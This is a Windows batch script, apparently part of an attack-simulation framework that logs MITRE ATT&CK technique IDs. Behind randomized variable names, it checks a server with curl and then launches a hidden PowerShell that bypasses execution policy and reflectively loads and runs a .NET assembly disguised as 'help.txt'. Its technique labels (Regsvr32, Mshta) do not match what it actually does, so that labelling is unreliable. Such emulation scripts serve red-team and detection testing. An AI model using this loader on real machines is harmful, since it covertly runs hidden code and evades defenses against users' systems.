@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\8069\3a5d8a6e
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8069-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=help.txt
SET ewjmdkff=8069

REM Derived values for logging
SET zxcqwa=%APPDATA%\%pudaazx%
SET lkjhgf=%zxcqwa%\macula-simulation.log
SET mnbvcx=powershell.exe

REM Debug: start of script
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: script_started>>> "%lkjhgf%" 2>nul

REM Check server availability with curl
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_start url=%drguvr%>>> "%lkjhgf%" 2>nul
curl -k -s -o nul "%drguvr%"
SET nbmkio=%ERRORLEVEL%
IF %nbmkio% EQU 0 (
    SET vcxzas=1
    SET qazxsw=
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_success>>> "%lkjhgf%" 2>nul
) ELSE (
    SET vcxzas=0
    SET qazxsw=connection_refused
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_failed code=%nbmkio%>>> "%lkjhgf%" 2>nul
)

REM Log TTP T1218.010 (Regsvr32)
SET poiuyt=T1218.010
SET lkjmnb=SignedBinaryProxyExecutionRegsvr32
echo [%DATE% %TIME%][!hlbnp!]: !pudaazx!-!ewjmdkff!-!poiuyt!|!lkjmnb!=!vcxzas!:!qazxsw!>> "%lkjhgf%" 2>nul || REM

REM Change to output directory
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: chdir_start path=%pjkcpgw%>>> "%lkjhgf%" 2>nul
cd /d "%pjkcpgw%" >nul 2>&1
IF NOT %ERRORLEVEL% EQU 0 (
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: chdir_failed>>> "%lkjhgf%" 2>nul
    EXIT /B 1
)
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: chdir_success>>> "%lkjhgf%" 2>nul

REM Execute .NET DLL via PowerShell
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: dll_exec_start file=%syjfr%>>> "%lkjhgf%" 2>nul
%mnbvcx% -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('%syjfr%')).EntryPoint.Invoke($null, @(,[string[]]@())) }" >nul 2>&1
SET xswqaz=%ERRORLEVEL%
IF %xswqaz% EQU 0 (
    SET qweasd=1
    SET zxcdsa=
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: dll_exec_success>>> "%lkjhgf%" 2>nul
) ELSE (
    SET qweasd=0
    SET zxcdsa=assembly_load_failed
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: dll_exec_failed code=%xswqaz%>>> "%lkjhgf%" 2>nul
)

REM Log TTP T1218.005 (Mshta)
SET mnbvfr=T1218.005
SET cxzlkj=SignedBinaryProxyExecutionMshta
echo [%DATE% %TIME%][!hlbnp!]: !pudaazx!-!ewjmdkff!-!mnbvfr!|!cxzlkj!=!qweasd!:!zxcdsa!>> "%lkjhgf%" 2>nul || REM

REM Debug: end of script
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: script_completed>>> "%lkjhgf%" 2>nul

ENDLOCAL